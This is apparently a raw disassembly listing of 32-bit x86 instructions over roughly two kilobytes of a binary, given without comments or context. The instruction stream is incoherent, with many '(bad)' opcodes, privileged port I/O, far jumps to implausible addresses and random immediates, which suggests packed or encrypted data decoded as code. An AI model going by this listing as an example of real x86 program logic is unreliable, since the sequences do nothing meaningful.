  40bc9a:	dec    ecx
  40bc9b:	outs   dx,DWORD PTR ds:[esi]
  40bc9c:	ficom  DWORD PTR [ebp-0x661013dd]
  40bca2:	je     0x40bcac
  40bca4:	out    0x1f,eax
  40bca6:	adc    BYTE PTR [esi+0x52],bl
  40bca9:	clc    
  40bcaa:	pop    ecx
  40bcab:	sub    ch,BYTE PTR [ebp+0xa]
  40bcae:	mov    al,0x3c
  40bcb0:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40bcb2:	mov    ecx,0x7645e390
  40bcb7:	jnp    0x40bd00
  40bcb9:	jae    0x40bccf
  40bcbb:	inc    eax
  40bcbc:	aad    0x31
  40bcbe:	mov    esi,0x244ecb
  40bcc3:	push   ebp
  40bcc4:	repnz shr ebx,cl
  40bcc7:	scas   al,BYTE PTR es:[edi]
  40bcc8:	mov    eax,ds:0xa617d759
  40bccd:	xor    ah,ch
  40bccf:	ja     0x40bc68
  40bcd1:	jnp    0x40bce1
  40bcd3:	fcomp  QWORD PTR [edx+eiz*4+0x9]
  40bcd7:	inc    eax
  40bcd8:	fwait
  40bcd9:	(bad)  
  40bcda:	xor    eax,0xa6a621c1
  40bcdf:	icebp  
  40bce0:	dec    esi
  40bce1:	rcl    BYTE PTR ds:0x1f49792d,0x3d
  40bce8:	inc    edi
  40bce9:	loopne 0x40bc98
  40bceb:	out    0xb9,eax
  40bced:	sahf   
  40bcee:	imul   DWORD PTR [ecx+0x212ef3ac]
  40bcf4:	(bad)  
  40bcf5:	daa    
  40bcf6:	or     eax,0x6f3e3d7e
  40bcfb:	sub    BYTE PTR [ebp-0xdbc0bd2],al
  40bd01:	out    0x99,al
  40bd03:	mov    ecx,0xaa5d5dd8
  40bd08:	mov    BYTE PTR [ebp+0x41],dl
  40bd0b:	and    ebp,DWORD PTR [edx]
  40bd0d:	shr    BYTE PTR ds:0xd6416033,1
  40bd13:	push   ebx
  40bd14:	cmp    ch,BYTE PTR [ebx+0x2ea82e52]
  40bd1a:	jle    0x40bd71
  40bd1c:	call   DWORD PTR [eax-0x1fd61876]
  40bd22:	arpl   dx,si
  40bd24:	mov    bl,0xb
  40bd26:	push   ds
  40bd27:	jp     0x40bd38
  40bd29:	xchg   DWORD PTR [edi-0x44],ebx
  40bd2c:	int    0x61
  40bd2e:	daa    
  40bd2f:	add    al,0x3
  40bd31:	fwait
  40bd32:	mov    cl,0x99
  40bd34:	in     eax,dx
  40bd35:	bound  ebx,QWORD PTR [edi]
  40bd37:	sbb    edx,esp
  40bd39:	hlt    
  40bd3a:	pop    edx
  40bd3b:	mov    al,0xf5
  40bd3d:	icebp  
  40bd3e:	cld    
  40bd3f:	jge    0x40bd22
  40bd41:	mov    ebp,DWORD PTR ds:0x4a5a203d
  40bd47:	jo     0x40bd2d
  40bd49:	out    0x66,eax
  40bd4b:	xchg   DWORD PTR [ecx],ecx
  40bd4d:	pop    edi
  40bd4e:	or     al,0x90
  40bd50:	and    dl,BYTE PTR [edx]
  40bd52:	(bad)  
  40bd53:	imul   edx,ebx,0xda1b430b
  40bd59:	out    dx,al
  40bd5a:	mov    al,ds:0xacab839e
  40bd5f:	test   DWORD PTR [ebp-0x4e083ea5],esi
  40bd65:	scas   eax,DWORD PTR es:[edi]
  40bd66:	stos   DWORD PTR es:[edi],eax
  40bd67:	js     0x40bd77
  40bd69:	xchg   ebp,eax
  40bd6a:	jmp    eax
  40bd6c:	mov    dh,bl
  40bd6e:	sub    al,BYTE PTR [edi+0x2a]
  40bd71:	or     ebp,eax
  40bd73:	mov    cl,0xd2
  40bd75:	sbb    cl,BYTE PTR [esi-0x55]
  40bd78:	and    eax,0xd0097e1b
  40bd7d:	test   ebx,ebx
  40bd7f:	es fwait
  40bd81:	add    ebp,esi
  40bd83:	xor    edx,DWORD PTR [ecx]
  40bd85:	mov    ds:0x3947e0db,eax
  40bd8a:	mov    cl,0x76
  40bd8c:	cs or  eax,0x5b390450
  40bd92:	mov    eax,ds:0x85ea917f
  40bd97:	dec    BYTE PTR [ebx-0x7e99cc7a]
  40bd9d:	inc    ebx
  40bd9e:	dec    ecx
  40bd9f:	jmp    0xbf0e:0x176db3d
  40bda6:	(bad)  
  40bda7:	icebp  
  40bda8:	xchg   esi,eax
  40bda9:	mov    ds:0x18e5c78d,eax
  40bdae:	adc    al,0xd3
  40bdb0:	cld    
  40bdb1:	sub    esi,DWORD PTR [ecx-0x39]
  40bdb4:	out    dx,al
  40bdb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bdb6:	or     ah,al
  40bdb8:	xchg   ebx,eax
  40bdb9:	push   esp
  40bdba:	push   ecx
  40bdbb:	xchg   DWORD PTR [ebp+edi*1+0x5a],esp
  40bdbf:	int    0xdb
  40bdc1:	into   
  40bdc2:	jp     0x40be2d
  40bdc4:	xlat   BYTE PTR ds:[ebx]
  40bdc5:	rol    BYTE PTR [ebp-0x50],1
  40bdc8:	test   DWORD PTR [ebp-0x46],esp
  40bdcb:	dec    esi
  40bdcc:	push   eax
  40bdcd:	or     ebx,DWORD PTR [edx]
  40bdcf:	daa    
  40bdd0:	mov    edx,0xf32e44f8
  40bdd5:	ins    BYTE PTR es:[edi],dx
  40bdd6:	push   ecx
  40bdd7:	sub    eax,0xe8729154
  40bddc:	jg     0x40be1d
  40bdde:	in     eax,0x4
  40bde0:	pusha  
  40bde1:	mov    ds:0xf064cebd,al
  40bde6:	shr    eax,1
  40bde8:	repz xor dh,BYTE PTR [ebx-0x46]
  40bdec:	stc    
  40bded:	xor    BYTE PTR [esi],cl
  40bdef:	jmp    0x6df100e8
  40bdf4:	mov    esi,0x38414387
  40bdf9:	xchg   BYTE PTR [eax],cl
  40bdfb:	shr    edi,cl
  40bdfd:	xchg   ebp,eax
  40bdfe:	mov    BYTE PTR [edx+0x11],bl
  40be01:	(bad)  [ecx+ecx*1+0x45]
  40be05:	and    DWORD PTR ss:0x4460d83b,ecx
  40be0c:	mov    ds:0xe3094846,al
  40be11:	pushf  
  40be12:	ror    DWORD PTR [ebp+0x74],0x9d
  40be16:	inc    ecx
  40be17:	mov    edx,0x18e315c8
  40be1c:	mov    BYTE PTR [esi+eax*1],bl
  40be1f:	nop
  40be20:	push   es
  40be21:	push   0x9b68ed6
  40be26:	arpl   ax,si
  40be28:	lds    ebp,FWORD PTR [esi-0x5c983dc9]
  40be2e:	mov    al,ds:0x18e86dda
  40be33:	sub    ebp,ecx
  40be35:	and    ch,bl
  40be37:	adc    dl,cl
  40be39:	inc    esp
  40be3a:	jp     0x40bdf5
  40be3c:	inc    ebp
  40be3d:	inc    edx
  40be3e:	sbb    edi,DWORD PTR [ebx]
  40be40:	add    eax,0x65761b66
  40be45:	(bad)  
  40be47:	add    al,0xc5
  40be49:	add    al,0x65
  40be4b:	rcr    BYTE PTR [eax+0x1ac9adf7],cl
  40be51:	cmp    cl,BYTE PTR [ebp-0x71ece893]
  40be57:	dec    ebx
  40be58:	ss hlt 
  40be5a:	jno    0x40be2c
  40be5c:	sbb    BYTE PTR [edi+0x0],dh
  40be5f:	mov    bl,0x7b
  40be61:	int3   
  40be62:	mov    edi,DWORD PTR [esi+edx*8-0x33470d8]
  40be69:	bound  edi,QWORD PTR [ecx-0x48]
  40be6c:	aas    
  40be6d:	and    eax,0x14750196
  40be72:	retf   0x38e2
  40be75:	sbb    bh,BYTE PTR [ebp-0x32575326]
  40be7b:	scas   al,BYTE PTR es:[edi]
  40be7c:	mov    ebp,0x9d336590
  40be81:	mov    esi,DWORD PTR [esi+0xeffb668]
  40be87:	mov    bh,0x5
  40be89:	paddd  mm3,QWORD PTR [ebx]
  40be8c:	sbb    eax,0xffffff98
  40be8f:	pop    ecx
  40be90:	mov    esi,0xbd9bd6e4
  40be95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be96:	mov    esp,0xc2f14a9e
  40be9b:	mov    bh,0x77
  40be9d:	cwde   
  40be9e:	adc    DWORD PTR [ecx],0xffffffaf
  40bea1:	inc    ebp
  40bea2:	inc    ebp
  40bea3:	or     esi,esi
  40bea5:	int    0xab
  40bea7:	ret    
  40bea8:	dec    eax
  40bea9:	jns    0x40be34
  40beab:	repnz push 0xffffff8a
  40beae:	push   eax
  40beaf:	mov    bh,0x97
  40beb1:	inc    ebx
  40beb2:	data16 hlt 
  40beb4:	pop    es
  40beb5:	out    0x78,eax
  40beb7:	add    ebp,DWORD PTR gs:[edi-0x62]
  40bebb:	scas   al,BYTE PTR es:[edi]
  40bebc:	dec    ecx
  40bebd:	inc    edi
  40bebe:	out    0xf,al
  40bec0:	push   ds
  40bec1:	ret    0xa3f
  40bec4:	js     0x40bef2
  40bec6:	cdq    
  40bec7:	(bad)  
  40bec8:	ds sbb ebp,esp
  40becb:	dec    ebp
  40becc:	icebp  
  40becd:	push   ebx
  40bece:	cmp    ch,BYTE PTR [eax-0x27c0749c]
  40bed4:	mov    esi,0x2f8c58e6
  40bed9:	xchg   ebp,eax
  40beda:	outs   dx,DWORD PTR ds:[esi]
  40bedb:	sahf   
  40bedc:	rcl    BYTE PTR [edi-0x6bfd599],0xc5
  40bee3:	add    eax,DWORD PTR [edi-0x70]
  40bee6:	ror    DWORD PTR [ecx-0x4143d384],1
  40beec:	fistp  DWORD PTR [eax+0x3c]
  40beef:	call   0xa8fb:0x34907c00
  40bef6:	lock bound edi,QWORD PTR ds:[eax+0x4b]
  40befb:	fs shl dl,0xfc
  40beff:	(bad)  
  40bf00:	fild   WORD PTR [ecx+0x74]
  40bf03:	mov    eax,0xc50a59b5
  40bf08:	and    al,0xc5
  40bf0a:	into   
  40bf0b:	test   edx,edi
  40bf0d:	retf   0x2c8c
  40bf10:	push   ecx
  40bf11:	je     0x40bf4c
  40bf13:	js     0x40bed7
  40bf15:	xchg   edx,eax
  40bf16:	or     al,0xfe
  40bf18:	cmp    DWORD PTR [ebx+ecx*4-0x68],edi
  40bf1c:	adc    ecx,esp
  40bf1e:	and    DWORD PTR [edi-0x56],edx
  40bf21:	test   eax,0x33d5023c
  40bf26:	lods   al,BYTE PTR ds:[esi]
  40bf27:	add    BYTE PTR ds:0x5cb4548c,bl
  40bf2d:	(bad)  
  40bf2e:	lock clc 
  40bf30:	pusha  
  40bf31:	mov    edi,0x7489461d
  40bf36:	ins    BYTE PTR es:[edi],dx
  40bf37:	mov    eax,0x2e68e01f
  40bf3c:	xchg   edi,eax
  40bf3d:	rcr    BYTE PTR ds:0x709bf206,cl
  40bf43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf44:	push   0xffffff93
  40bf46:	call   0x61d9a2e6
  40bf4b:	xchg   ebx,eax
  40bf4c:	push   es
  40bf4d:	mov    ebx,0x101f926
  40bf52:	push   0xffffffef
  40bf54:	(bad)  
  40bf56:	xor    BYTE PTR [ebx+0x6],bl
  40bf59:	aad    0x7
  40bf5b:	cmp    eax,0x971935e0
  40bf60:	cli    
  40bf61:	(bad)  
  40bf62:	ss ja  0x40bf02
  40bf65:	daa    
  40bf66:	popf   
  40bf67:	popf   
  40bf68:	ror    DWORD PTR [ebx],cl
  40bf6a:	(bad)  
  40bf6b:	adc    esp,DWORD PTR [eax+0x56]
  40bf6e:	fdivr  st,st(5)
  40bf70:	pop    eax
  40bf71:	sar    BYTE PTR ds:0x442d8ab,0xae
  40bf78:	bound  ecx,QWORD PTR [ebp+0x16ce0324]
  40bf7e:	imul   ebx,DWORD PTR [ebx+0x2],0x33763037
  40bf85:	fs jge 0x40bfe4
  40bf88:	icebp  
  40bf89:	pop    esi
  40bf8a:	mov    BYTE PTR [eax+0x7c948295],ah
  40bf90:	sar    BYTE PTR [eax-0x2630b069],0x79
  40bf97:	jo     0x40bfbe
  40bf99:	aas    
  40bf9a:	push   edi
  40bf9b:	sub    esi,DWORD PTR [edx+0x4b]
  40bf9e:	cmp    BYTE PTR [edx+ecx*8],0xb3
  40bfa2:	adc    eax,edx
  40bfa4:	mov    ebx,0xe570a1f4
  40bfa9:	imul   edi,DWORD PTR [eax-0x5a],0x9dedd834
  40bfb0:	inc    edx
  40bfb1:	repnz pop ss
  40bfb3:	mov    edx,0x17c4474b
  40bfb8:	inc    ecx
  40bfb9:	cmc    
  40bfba:	or     cl,BYTE PTR [edx]
  40bfbc:	mov    ds:0xeccc6bcd,al
  40bfc1:	nop
  40bfc2:	pop    eax
  40bfc3:	imul   ebp,DWORD PTR [ebp+edi*4+0x75b0405e],0xa11fce63
  40bfce:	mov    esi,0x597154d6
  40bfd3:	ret    
  40bfd4:	jmp    0x40bfa5
  40bfd6:	xor    DWORD PTR [edx-0x5835063a],ecx
  40bfdc:	add    ch,al
  40bfde:	aas    
  40bfdf:	or     eax,0x8ca8e53f
  40bfe4:	dec    esp
  40bfe5:	add    ah,BYTE PTR [eax+ebx*8+0x53]
  40bfe9:	dec    esi
  40bfea:	jmp    0x1f85:0x562a387f
  40bff1:	push   0x6e
  40bff3:	xor    al,0x8e
  40bff5:	loopne 0x40c029
  40bff7:	dec    ebp
  40bff8:	rcr    DWORD PTR [eax-0x20],0x82
  40bffc:	lds    edx,FWORD PTR [esi-0x69]
  40bfff:	cmp    dl,BYTE PTR [edx-0x26a2e01c]
  40c005:	push   edx
  40c006:	shl    BYTE PTR [edx+0x4f],0x44
  40c00a:	test   BYTE PTR [edi+esi*2],0x76
  40c00e:	pop    ds
  40c00f:	jns    0x40c055
  40c011:	inc    ecx
  40c012:	mov    bl,0x67
  40c014:	cmp    edi,ecx
  40c016:	scas   al,BYTE PTR es:[edi]
  40c017:	lahf   
  40c018:	mov    al,0x4e
  40c01a:	arpl   cx,dx
  40c01c:	sbb    dl,BYTE PTR [ecx-0x73]
  40c01f:	imul   edi,DWORD PTR [eax+0x67],0xffffffd0
  40c023:	ss cdq 
  40c025:	fcmovnbe st,st(2)
  40c027:	sbb    ebp,0x9afd3125
  40c02d:	or     eax,0xc1a1b34b
  40c032:	push   ebx
  40c033:	js     0x40c050
  40c035:	dec    edx
  40c036:	adc    DWORD PTR [ebx-0x78c729b8],0x1c
  40c03d:	xchg   ebx,eax
  40c03e:	xchg   DWORD PTR [edx+eax*4],ecx
  40c041:	or     al,0x10
  40c043:	mov    gs,WORD PTR [ebp+eiz*4+0x62d6e952]
  40c04a:	mov    ebp,?
  40c04c:	add    al,0x2e
  40c04e:	dec    ebp
  40c04f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c050:	pop    ss
  40c051:	repz jae 0x40bfdf
  40c054:	jl     0x40c01a
  40c056:	push   es
  40c057:	inc    DWORD PTR ss:[ecx]
  40c05a:	in     eax,0x3b
  40c05c:	aaa    
  40c05d:	sub    ebp,edx
  40c05f:	es in  al,dx
  40c061:	std    
  40c062:	(bad)  
  40c063:	add    eax,0x9b969f2e
  40c068:	pop    edi
  40c069:	add    eax,0x548198d7
  40c06e:	jmp    0xdb9d71ce
  40c073:	fisub  WORD PTR [esi+ebp*2-0x7b1ae4a9]
  40c07a:	outs   dx,DWORD PTR ds:[esi]
  40c07b:	mov    edx,0xaed70129
  40c080:	cdq    
  40c081:	mov    ss,WORD PTR [eax]
  40c083:	mov    dl,0x82
  40c085:	sub    eax,0x6b97a1cc
  40c08a:	push   esp
  40c08b:	mov    edi,ds
  40c08d:	fwait
  40c08e:	cmp    BYTE PTR [ecx+0x0],cl
  40c091:	mov    BYTE PTR [edx+0x6db591ff],bl
  40c097:	or     edx,DWORD PTR [edi]
  40c099:	add    ecx,edi
  40c09b:	imul   DWORD PTR [ebx]
  40c09d:	ret    
  40c09e:	inc    eax
  40c09f:	fwait
  40c0a0:	add    cl,0x92
  40c0a3:	pushf  
  40c0a4:	std    
  40c0a5:	pop    esp
  40c0a6:	dec    ebp
  40c0a7:	std    
  40c0a8:	scas   al,BYTE PTR es:[edi]
  40c0a9:	stos   BYTE PTR es:[edi],al
  40c0aa:	push   0x485a9dee
  40c0af:	(bad)
  40c0b2:	loopne 0x40c0b2
  40c0b4:	and    ebx,DWORD PTR [esi-0xc]
  40c0b7:	in     al,0xda
  40c0b9:	jno    0x40c10e
  40c0bb:	inc    esp
  40c0bc:	adc    BYTE PTR [eax+0x138244ae],dl
  40c0c2:	ss push esi
  40c0c4:	xchg   esp,eax
  40c0c5:	fsubrp st(3),st
  40c0c7:	xor    ebp,0xffffffce
  40c0ca:	pop    ss
  40c0cb:	cmp    BYTE PTR [ebp-0x591a898],0xea
  40c0d2:	jae    0x40c12e
  40c0d4:	(bad)  
  40c0d5:	mov    edx,0x630d35ae
  40c0da:	rol    DWORD PTR [ebp+eax*1-0x2e],0xbd
  40c0df:	ffreep st(0)
  40c0e1:	lahf   
  40c0e2:	and    al,0x3e
  40c0e4:	and    ecx,DWORD PTR [ebx+0x17860466]
  40c0ea:	in     al,0x3
  40c0ec:	adc    al,0xa7
  40c0ee:	add    ebx,ebx
  40c0f0:	je     0x40c09e
  40c0f2:	jns    0x40c099
  40c0f4:	scas   al,BYTE PTR es:[edi]
  40c0f5:	mov    al,0x1
  40c0f7:	mov    ebp,0x6da80c1a
  40c0fc:	imul   edi,DWORD PTR ds:0x7f6c0459,0x894a2220
  40c106:	shl    BYTE PTR [edx+0x58ef5ceb],cl
  40c10c:	pop    esp
  40c10d:	aas    
  40c10e:	loope  0x40c0f5
  40c110:	loope  0x40c0c4
  40c112:	add    al,0xb4
  40c115:	pop    ss
  40c116:	xor    DWORD PTR [edi+ebx*4-0x3d],edx
  40c11a:	shr    ecx,0x71
  40c11d:	add    eax,0xeb75e97e
  40c122:	dec    ebx
  40c123:	fwait
  40c124:	inc    ecx
  40c125:	mov    ds:0x57b7b365,al
  40c12a:	mov    bl,0x68
  40c12c:	add    al,0xb
  40c12e:	mov    DWORD PTR [esi],eax
  40c130:	daa    
  40c131:	int3   
  40c132:	xchg   DWORD PTR [ebp+0x40],ebx
  40c135:	adc    eax,esp
  40c137:	jbe    0x40c0d0
  40c139:	jns    0x40c153
  40c13b:	popf   
  40c13c:	stos   DWORD PTR es:[edi],eax
  40c13d:	(bad)  
  40c13e:	lods   al,BYTE PTR ds:[esi]
  40c13f:	out    0x26,eax
  40c141:	jle    0x40c18e
  40c143:	xchg   esp,eax
  40c144:	cmp    BYTE PTR [ebx+0x77319dd2],ah
  40c14a:	adc    bl,BYTE PTR [eax+0x288980b5]
  40c150:	mov    eax,0xe03e8a02
  40c155:	adc    eax,0x225d481d
  40c15a:	in     al,dx
  40c15b:	(bad)  
  40c15c:	out    0x9c,eax
  40c15e:	mov    ?,WORD PTR [edi]
  40c160:	dec    edi
  40c161:	mov    DWORD PTR [esi+0x5b51f50f],ecx
  40c167:	sub    BYTE PTR [ebp+0x357535fc],0x6f
  40c16e:	jnp    0x40c132
  40c170:	xchg   edx,eax
  40c171:	add    eax,0x6200a7f8
  40c176:	mov    bl,0xce
  40c178:	aas    
  40c179:	mov    al,ds:0x2e58c7e6
  40c17e:	push   cs
  40c17f:	mov    ch,0xa3
  40c181:	add    ebp,ebx
  40c183:	inc    edi
  40c184:	sti    
  40c185:	sbb    al,0xbe
  40c187:	add    eax,0xa6f98e80
  40c18c:	jp     0x40c1b0
  40c18e:	cmp    ebp,DWORD PTR [esi-0x4903ff3]
  40c194:	inc    ebx
  40c195:	xor    eax,0xc7990f49
  40c19a:	neg    BYTE PTR [edi+0x66]
  40c19d:	int3   
  40c19e:	ins    BYTE PTR es:[edi],dx
  40c19f:	ins    DWORD PTR es:[edi],dx
  40c1a0:	mov    ebp,0xf7723cf4
  40c1a5:	imul   edi,DWORD PTR [ebp+0x140460e3],0xfffffff4
  40c1ac:	inc    ebp
  40c1ad:	add    ch,BYTE PTR [edi-0x63341832]
  40c1b3:	cmp    eax,0xb8e1e840
  40c1b8:	aas    
  40c1b9:	loopne 0x40c187
  40c1bb:	mov    cl,0x19
  40c1bd:	dec    ebp
  40c1be:	(bad)  
  40c1bf:	imul   esi,DWORD PTR [edi-0x5ed3f581],0x13028c93
  40c1c9:	imul   eax,esi,0x70
  40c1cc:	mov    ebx,0xa5ab3583
  40c1d1:	iret   
  40c1d2:	addr16 retf 0x5fd1
  40c1d6:	pop    ds
  40c1d7:	(bad)  
  40c1d8:	fadd   DWORD PTR [ebp-0x74]
  40c1db:	xchg   DWORD PTR [edi],ecx
  40c1dd:	sbb    eax,DWORD PTR [ebp-0x23c3aa9b]
  40c1e3:	rol    DWORD PTR [edi+0x22c8f650],0xaf
  40c1ea:	enter  0x59b5,0x2b
  40c1ee:	sub    BYTE PTR [edx],dl
  40c1f0:	adc    DWORD PTR [eax+0x1d],ebp
  40c1f3:	daa    
  40c1f4:	xchg   ebp,eax
  40c1f5:	fistp  DWORD PTR [eax-0x23]
  40c1f8:	xchg   ebp,eax
  40c1f9:	aad    0x6f
  40c1fb:	(bad)  
  40c1fc:	jo     0x40c1c1
  40c1fe:	and    eax,0x6aa657cb
  40c203:	lahf   
  40c204:	nop    DWORD PTR [edx+0x3fbf06e2]
  40c20b:	adc    eax,0x97c98e6
  40c210:	in     al,dx
  40c211:	test   DWORD PTR [ecx-0x1d],esp
  40c214:	sti    
  40c215:	jo     0x40c1ef
  40c217:	rcl    BYTE PTR [ecx+edi*8],0xef
  40c21b:	lods   al,BYTE PTR ds:[esi]
  40c21c:	mov    ds,WORD PTR [ebx-0x2514578f]
  40c222:	ret    0x8e6d
  40c225:	xchg   dh,cl
  40c227:	mov    ebp,0x5a088975
  40c22c:	mov    esi,0x3bda311c
  40c231:	mul    DWORD PTR [ebp+0x5302a520]
  40c237:	lea    edx,[eax-0x48]
  40c23a:	je     0x40c295
  40c23c:	in     eax,dx
  40c23d:	repz icebp 
  40c23f:	jo     0x40c1c1
  40c241:	jle    0x40c289
  40c243:	or     DWORD PTR [ecx],eax
  40c245:	dec    eax
  40c246:	dec    eax
  40c247:	je     0x40c1d4
  40c249:	fst    st(7)
  40c24b:	int3   
  40c24c:	mov    ds:0xbabab05b,eax
  40c251:	lds    eax,FWORD PTR [ebx+0x4c]
  40c254:	inc    ebp
  40c255:	sub    esp,ecx
  40c257:	dec    ebp
  40c258:	mov    dl,0x2
  40c25a:	and    eax,0x1ba2a492
  40c25f:	fisttp DWORD PTR [edx+0x7f32fe11]
  40c265:	or     dl,0xd0
  40c268:	fisttp WORD PTR [ebx+0x6c]
  40c26b:	or     ebp,DWORD PTR [edx+0x78b3b311]
  40c271:	ret    
  40c272:	push   ecx
  40c273:	sub    DWORD PTR [edi],ecx
  40c275:	(bad)  
  40c276:	ins    BYTE PTR es:[edi],dx
  40c277:	inc    edx
  40c278:	dec    esp
  40c279:	lds    eax,FWORD PTR [eax+edx*8]
  40c27c:	adc    esi,DWORD PTR [esi-0x59de7a64]
  40c282:	test   al,0x1e
  40c284:	aas    
  40c285:	mov    ds:0xe3cb34a6,eax
  40c28a:	push   ecx
  40c28b:	enter  0xbd24,0x33
  40c28f:	mov    BYTE PTR [ebx+0x1b],cl
  40c292:	mov    edx,DWORD PTR [edx+0x2fd7ebae]
  40c298:	jl     0x40c220
  40c29a:	push   0xe75e6fd3
  40c29f:	(bad)
  40c2a3:	pop    ebp
  40c2a4:	rcl    esi,0x32
  40c2a7:	call   0x28fc:0x3692ea74
  40c2ae:	call   0x9b029ffa
  40c2b3:	dec    DWORD PTR [esi]
  40c2b5:	push   edx
  40c2b6:	xchg   esi,eax
  40c2b7:	fidivr WORD PTR [ebp-0x6cb67f6]
  40c2bd:	stos   BYTE PTR es:[edi],al
  40c2be:	pop    edx
  40c2bf:	add    al,0x4c
  40c2c1:	popa   
  40c2c2:	and    eax,ebx
  40c2c4:	out    0xba,eax
  40c2c6:	mov    ch,0xf7
  40c2c8:	aam    0xa7
  40c2ca:	xlat   BYTE PTR ds:[ebx]
  40c2cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2cc:	or     BYTE PTR ds:0x2790316b,bl
  40c2d2:	add    al,0x2f
  40c2d4:	mov    al,0x47
  40c2d6:	leave  
  40c2d7:	in     al,dx
  40c2d8:	test   DWORD PTR [ecx+0x7fb0c864],eax
  40c2de:	push   ss
  40c2df:	lods   al,BYTE PTR ds:[esi]
  40c2e0:	inc    edi
  40c2e1:	(bad)  
  40c2e2:	jno    0x40c343
  40c2e4:	mov    esi,0x2cc9afb3
  40c2e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2ea:	push   ebp
  40c2eb:	pushf  
  40c2ec:	das    
  40c2ed:	shl    DWORD PTR [ebp-0x537935d3],0x37
  40c2f4:	es push esi
  40c2f6:	sbb    al,0xd5
  40c2f8:	int3   
  40c2f9:	fnstcw WORD PTR [ebx+0xd0b763d]
  40c2ff:	leave  
  40c300:	xchg   BYTE PTR [ebx],cl
  40c302:	mov    edi,0xe4ed581b
  40c307:	mov    al,0xc1
  40c309:	push   eax
  40c30a:	push   ds
  40c30b:	lea    eax,[esi-0x1a00b229]
  40c311:	test   bh,cl
  40c313:	xlat   BYTE PTR ds:[ebx]
  40c314:	mov    DWORD PTR [eax-0x6bcb4a46],0x13e93c4
  40c31e:	sbb    DWORD PTR gs:[ecx-0x72cdf15],esi
  40c325:	cmp    DWORD PTR [edi-0x7fce830f],edi
  40c32b:	sbb    BYTE PTR [eax+ebp*8+0x15],0x27
  40c330:	mov    cl,0x64
  40c332:	repz mov cl,0x5a
  40c335:	test   BYTE PTR [eax-0x69],cl
  40c338:	iret   
  40c339:	lahf   
  40c33a:	mov    dl,0xfc
  40c33c:	dec    ecx
  40c33d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c33e:	sub    dh,0x5e
  40c341:	cld    
  40c342:	push   es
  40c343:	mov    al,ds:0x163449ae
  40c348:	sbb    eax,0x54425c2c
  40c34d:	out    dx,eax
  40c34e:	jo     0x40c393
  40c350:	inc    edi
  40c351:	leave  
  40c352:	lods   al,BYTE PTR ds:[esi]
  40c353:	jns    0x40c3c5
  40c355:	adc    eax,0x408103e7
  40c35a:	mov    cl,0x5b
  40c35c:	retf   0x26cf
  40c35f:	(bad)  
  40c361:	rol    ah,cl
  40c363:	xlat   BYTE PTR ds:[ebx]
  40c364:	inc    esi
  40c365:	retf   0x47f8
  40c368:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c369:	mov    bl,0xd9
  40c36b:	push   ss
  40c36c:	in     al,dx
  40c36d:	dec    esp
  40c36e:	sbb    eax,0x2d039f7e
  40c373:	dec    edi
  40c374:	out    0xbe,al
  40c376:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c377:	adc    eax,0x9449a4d9
  40c37c:	pop    edx
  40c37d:	ror    BYTE PTR [edi+0x40],cl
  40c380:	jae    0x40c3e2
  40c382:	shr    DWORD PTR [eax],cl
  40c384:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c385:	ins    DWORD PTR es:[edi],dx
  40c386:	sbb    eax,DWORD PTR [edx+edx*8]
  40c389:	jge    0x40c32f
  40c38b:	add    eax,0x398a34ac
  40c390:	aam    0x9
  40c392:	push   esi
  40c393:	ss mov al,0x6e
  40c396:	sub    BYTE PTR [esi-0x7c1761a7],0x16
  40c39d:	out    0xab,al
  40c39f:	and    eax,0x1fe10d72
  40c3a4:	dec    eax
  40c3a5:	mov    edi,0x6f978049
  40c3aa:	fsubr  QWORD PTR [edx]
  40c3ac:	cmp    DWORD PTR [ebx],esp
  40c3ae:	mov    fs,WORD PTR [ebx+0x600600da]
  40c3b4:	lds    esi,FWORD PTR [ecx+ecx*8-0x9]
  40c3b8:	nop
  40c3b9:	inc    ecx
  40c3ba:	js     0x40c390
  40c3bc:	cmp    al,BYTE PTR ds:0x112aaf25
  40c3c2:	add    dh,BYTE PTR [ebp-0x26]
  40c3c5:	fld    TBYTE PTR [ecx+esi*4-0x7c]
  40c3c9:	(bad)  
  40c3ca:	adc    al,0x75
  40c3cc:	neg    DWORD PTR [edi+0x1f]
  40c3cf:	inc    edi
  40c3d0:	jne    0x40c3d7
  40c3d2:	fsub   DWORD PTR [esi+0x23]
  40c3d5:	test   eax,0x32149bf9
  40c3da:	pop    ebp
  40c3db:	push   ss
  40c3dc:	push   edi
  40c3dd:	jbe    0x40c415
  40c3df:	push   es
  40c3e0:	test   DWORD PTR [esi+edx*8+0x7ad8a6d5],ebp
  40c3e7:	lahf   
  40c3e8:	fwait
  40c3e9:	xchg   esi,eax
  40c3ea:	fld    st(0)
  40c3ec:	and    BYTE PTR [eax-0x1ecfe4bf],bh
  40c3f2:	cmp    al,0xa1
  40c3f4:	cmp    DWORD PTR [esi-0x48c99690],ecx
  40c3fa:	call   ebx
  40c3fc:	(bad)  
  40c3fd:	push   ss
  40c3fe:	add    DWORD PTR [eax+edx*1],eax
  40c401:	ss aad 0xc5
  40c404:	jle    0x40c463
  40c406:	leave  
  40c407:	xlat   BYTE PTR ds:[ebx]
  40c408:	fldcw  WORD PTR [ecx]
  40c40a:	test   BYTE PTR [ebx+ecx*1],0x17
  40c40e:	jmp    0x710203dd
  40c413:	ret    
  40c414:	dec    ebx
  40c415:	cmp    BYTE PTR [ecx+0x5f5fff81],bl
  40c41b:	or     eax,0x433bc3af
  40c420:	ss cmc 
  40c422:	push   es
  40c423:	dec    ebp
  40c424:	or     DWORD PTR [ebp-0x2a976b5],edx
  40c42a:	push   ebx
  40c42b:	fdivr  QWORD PTR [ecx+0x7a]
  40c42e:	jo     0x40c438
  40c430:	in     al,0x4
  40c432:	jg     0x40c4aa
  40c434:	imul   eax,DWORD PTR [esp+ebx*8],0x519e99bf
  40c43b:	aam    0x9a
  40c43d:	int3   
  40c43e:	gs mov al,0x77
  40c441:	adc    eax,0xf5533bb9
  40c446:	xchg   ebx,eax
  40c447:	imul   DWORD PTR [ebx+0x4b]
